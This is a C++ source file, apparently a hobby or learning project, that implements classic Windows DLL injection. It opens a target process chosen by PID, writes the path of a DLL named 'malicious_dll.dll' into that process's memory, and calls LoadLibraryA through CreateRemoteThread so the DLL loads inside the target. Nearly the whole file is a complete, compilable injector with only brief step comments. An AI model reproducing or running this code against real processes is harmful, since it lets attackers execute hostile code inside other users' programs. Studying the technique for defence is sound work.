// PE-dll injection.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <stdio.h>
#include <windows.h>
#include <synchapi.h>
//#include <errhandlingapi.h>


/* Classic DLL Injection via createremotthread and loadlibrary

	1. Get the process id of the target process (e.g. with something like GetWindowThreadProcessId).
	2. Get a handle to the process with the appropriate permissions using OpenProcess.
	3. Allocate some memory in that process with VirtualAllocEx.
	4. Copy the name of your DLL into that memory with WriteProcessMemory.
	5. Get the address of the LoadLibrary function using GetProcAddress.
	6. Call CreateRemoteThread to start the LoadLibrary call in the target process, with the thread parameter being the memory you've allocated with VirtualAllocEx (containing the name of the DLL).

*/
struct Priv {
	char key_name[100];
	long value;
};

struct Priv Priv_table[] = {
	{"PROCESS_ALL_ACCESS", 0x1F0FFF },
	{"PROCESS_CREATE_PROCESS", 0x0080},
	{"PROCESS_CREATE_THREAD", 0x0002 },
	{"PROCESS_DUP_HANDLE", 0x0040},
	{"PROCESS_QUERY_INFORMATION", 0x0400},
	{"PROCESS_QUERY_LIMITED_INFORMATION", 0x1000},
	{"PROCESS_SET_INFORMATION", 0x0200},
	{"PROCESS_SET_QUOTA", 0x0100},
	{"PROCESS_SUSPEND_RESUME", 0x0800},
	{"PROCESS_TERMINATE", 0x0001},
	{"PROCESS_VM_OPERATION", 0x0008},
	{"PROCESS_VM_READ", 0x0010},
	{"PROCESS_VM_WRITE", 0x0020},
	{"SYNCHRONIZE", 0x00100000L},
};



int write_to_process_memory(int pid, long proc_priv) {
	HANDLE process_h;
	process_h = OpenProcess(proc_priv, 0, pid); 
	if (!process_h) {
		printf("Couldn't find this process with pid (%d).\n", GetLastError());
		return 0;
	}
	printf("Opened process %d.\n", pid);

	// virtualallocex
	int mem_size = 1024;
	LPVOID mem_address = VirtualAllocEx(
		process_h,
		0, //dont care where memory is allocated
		mem_size,
		MEM_COMMIT | MEM_RESERVE,	//reserve and commit pages
		PAGE_READWRITE //only need to read and write from
	);
	if (!mem_address) {
		printf("Couldn't allocate memory\nGetLastError: (%d).\n", GetLastError());
		return 0;
	}
	printf("VirtualAllocEx success\n");
	//write process memory
	//char dll_name[] = "C:\\\\Users\\\\undefined\\\\Documents\\\\shared\\\\repos\\\\malicious_dll\\\\Release\\\\malicious_dll.dll";
	char dll_name[] = "C:\\\\Users\\\\undefined\\\\Documents\\\\shared\\\\repos\\\\malicious_dll\\\\x64\\\\Release\\\\malicious_dll.dll";
	size_t buffer_sz = strlen(dll_name) + 1;

	SIZE_T bytes = 0;
	SIZE_T* bytes_written = &bytes;

	int result = WriteProcessMemory(
		process_h,
		mem_address,
		(LPCVOID)dll_name, //cast into pointer type acceptable to windows
		buffer_sz,  // trying dynamically
		bytes_written);
	if (!result) {
		printf("Couldn't write process memory (%d).\n", GetLastError());
		return 0;
	}

	printf("Wrote process memory, %zu bytes.\n", *bytes_written);
	// check if bytes written match size of string?

	//createremotethread prereqs:
	LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	if (addr == NULL) {
		printf("Error: the LoadLibraryA function was not found inside kernel32.dll library.n\n");
		return 0;
	}
	printf("Got LoadLibraryA function address\n");
	printf("loadlibrary at %p\n", addr);

	DWORD return_threadid;

	HANDLE threadID = CreateRemoteThread(
		process_h,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)addr, //start routine address
		mem_address,					// parameter to pass to start routine
		NULL,
		&return_threadid);
	if (threadID == NULL) {
		printf("Error: the remote thread could not be created.\n");
		printf("getting last error\n", GetLastError());
		return 0;
	}
	else {
		printf("Success: the remote thread was successfully created.\n");
		printf("Thread ID is %d\n", return_threadid);
		
	}


	//Sleep(100000);
	return 1;
}


int __cdecl main(int argc, char* argv[])
{

	int pid;
	if (argv[1]) {
		printf("PID provided!\n");
		pid = atoi(argv[1]);
	}
	else {
		//pid = 19484;
		printf("No pid provided\n");
		printf("Please enter target PID\n");
		scanf_s("%d", &pid);
	}

	printf("You have chosen %d\n", pid);
	printf("Attempting to open process handle\n");




	/*
	//because sizeof returns in bytes
	int array_size = sizeof(Priv_table)/ sizeof(Priv);	//try divide by sizeof(priv_table[0]);
	printf("size of process privs is %d\n", int(array_size));
	for (int i = 0; i < array_size; i++) {
		Priv priv = Priv_table[i];
		printf("[*] Trying privilege %s\n", priv.key_name);

		int temp = write_to_process_memory(pid, priv.value);
		if (temp == 0) {
			continue; //printf("Couldn't write memory with permission.\n");
		}
		else {
			printf("Can write to memory with permission.\n");
		}
	}
	*/


	//lets try PROCESS_VM_OPERATION | PROCESS_VM_WRITE, otherwise try just all perms
	int a = write_to_process_memory(pid, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD);
	if (a == 0) {
		printf("Couldn't write memory with combined.\n");
	}
	else {
		printf("Success. Can write to memory with combined permission.\n");
	}



		printf("\n\n\n\n\n\n\n\n\n");
		return 1;
}


/*
	PROCESS_ALL_ACCESS =  0x1F0FFF
	PROCESS_CREATE_PROCESS = 0x0080
	PROCESS_CREATE_THREAD= 0x0002
	PROCESS_DUP_HANDLE= 0x0040
	PROCESS_QUERY_INFORMATION= 0x0400
	PROCESS_QUERY_LIMITED_INFORMATION= 0x1000
	PROCESS_SET_INFORMATION= 0x0200
	PROCESS_SET_QUOTA = 0x0100
	PROCESS_SUSPEND_RESUME = 0x0800
	PROCESS_TERMINATE = 0x0001
	PROCESS_VM_OPERATION = 0x0008
	PROCESS_VM_READ =0x0010
	PROCESS_VM_WRITE = 0x0020
	SYNCHRONIZE = 0x00100000L
*/